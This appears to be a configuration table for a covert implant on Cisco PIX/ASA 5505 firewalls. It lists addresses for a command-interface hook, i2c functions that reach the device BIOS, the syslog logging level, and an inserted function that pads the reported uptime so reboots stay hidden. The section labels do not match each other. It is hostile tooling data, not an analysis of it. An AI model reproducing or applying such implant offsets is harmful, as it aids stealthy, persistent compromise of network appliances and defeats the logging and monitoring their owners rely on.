; --- SECTION I ---
;
0x40084200            // pix version
0x2504000             // address of implant configuration
SyslogOffset              0x00000d84      // offset into the syslog structure where the logging level is stored
Open                      0x0806e450      // open
ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
InputModeOffset           0x14            // offset into a duart config structure where the input mode is stored
InputModeEsc              0x20            // Input mode used for entering escape sequence
WatchDogTimeout           0x09bca5c0      // Address where the thread timeout value is stored 
UpTimeCounter             0x0a32b814      // Address of the up time counter
Display_uptime_addr       0x080e3840      // Address of the function that display the uptime
Inserted_code_addr        0x0861910b      // Address of the our insterted function to add time to the uptime
i2cReadByte               0x095705c0      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte              0x09571290      // write byte function needed to operate on the bios of the asa 5505
CLIHookAddress            0x080e6255      // Address of hook into the command interface
AvailMemoryPtr            0x0a4787b8      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
